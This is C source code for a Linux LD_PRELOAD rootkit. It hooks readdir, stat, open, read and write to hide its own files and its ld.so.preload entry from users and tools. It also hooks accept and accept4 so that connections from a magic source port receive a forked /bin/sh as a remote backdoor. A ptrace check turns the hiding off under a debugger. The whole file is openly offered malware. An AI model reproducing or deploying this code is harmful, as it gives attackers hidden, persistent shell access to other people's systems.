#include "rootkit.h"

static void *get_orig(const char *name) {
    return dlsym(RTLD_NEXT, name);
}

static int is_stealth_active(void) {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return 1;
    ptrace(PTRACE_DETACH, 0, 1, 0);
    return 0;
}

static int is_hidden(const char *name) {
    if (!name) return 0;
    if (strstr(name, HIDDEN_PREFIX)) return 1;
    if (strstr(name, EVIL_LIB)) return 1;
    if (strstr(name, "ld.so.preload")) return 1;
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    if (is_stealth_active()) return ((orig_readdir_t)get_orig("readdir"))(dirp);
    orig_readdir_t orig = get_orig("readdir");
    struct dirent *e;
    while ((e = orig(dirp))) {
        if (!is_hidden(e->d_name)) return e;
    }
    return NULL;
}

ssize_t read(int fd, void *buf, size_t count) {
    orig_read_t orig = get_orig("read");
    ssize_t n = orig(fd, buf, count);
    if (n > 0 && !is_stealth_active()) {
        char *p = memmem(buf, n, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX));
        if (p) memset(buf, 0, n); 
        if (memmem(buf, n, EVIL_LIB, strlen(EVIL_LIB))) memset(buf, 0, n);
    }
    return n;
}

int __xstat(int ver, const char *path, struct stat *buf) {
    orig_xstat_t orig = get_orig("__xstat");
    if (!is_stealth_active() && is_hidden(path)) {
        int r = orig(ver, path, buf);
        buf->st_size = 0;
        return r;
    }
    return orig(ver, path, buf);
}

int stat(const char *path, struct stat *buf) {
    orig_stat_t orig = get_orig("stat");
    if (!is_stealth_active() && is_hidden(path)) {
        int r = orig(path, buf);
        buf->st_size = 0;
        return r;
    }
    return orig(path, buf);
}

int open(const char *path, int flags, ...) {
    orig_open_t orig = get_orig("open");
    const char *new_path = path;
    if (!is_stealth_active() && is_hidden(path)) new_path = "/dev/null";
    
    if (flags & O_CREAT) {
        va_list a; va_start(a, flags);
        mode_t m = va_arg(a, mode_t);
        va_end(a);
        return orig(new_path, flags, m);
    }
    return orig(new_path, flags);
}

int accept(int fd, struct sockaddr *sa, socklen_t *len) {
    orig_accept_t orig = get_orig("accept");
    int cfd = orig(fd, sa, len);
    if (cfd >= 0 && sa && sa->sa_family == AF_INET) {
        struct sockaddr_in *s = (struct sockaddr_in *)sa;
        if (ntohs(s->sin_port) == MAGIC_PORT) {
            if (fork() == 0) {
                dup2(cfd, 0); dup2(cfd, 1); dup2(cfd, 2);
                execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
                exit(0);
            }
            close(cfd);
            return -1;
        }
    }
    return cfd;
}

int accept4(int fd, struct sockaddr *sa, socklen_t *len, int flags) {
    orig_accept4_func_type orig = (orig_accept4_func_type)get_orig("accept4");
    int cfd = orig(fd, sa, len, flags);
    if (cfd >= 0 && sa && sa->sa_family == AF_INET) {
        struct sockaddr_in *s = (struct sockaddr_in *)sa;
        if (ntohs(s->sin_port) == MAGIC_PORT) {
            if (fork() == 0) {
                dup2(cfd, 0); dup2(cfd, 1); dup2(cfd, 2);
                execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
                exit(0);
            }
            close(cfd);
            return -1;
        }
    }
    return cfd;
}


ssize_t write(int fd, const void *buf, size_t count) {
    orig_write_t orig = get_orig("write");
    if (!is_stealth_active() && buf && count > 0) {
        if (memmem(buf, count, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) ||
            memmem(buf, count, EVIL_LIB, strlen(EVIL_LIB))) return count;
    }
    return orig(fd, buf, count);
}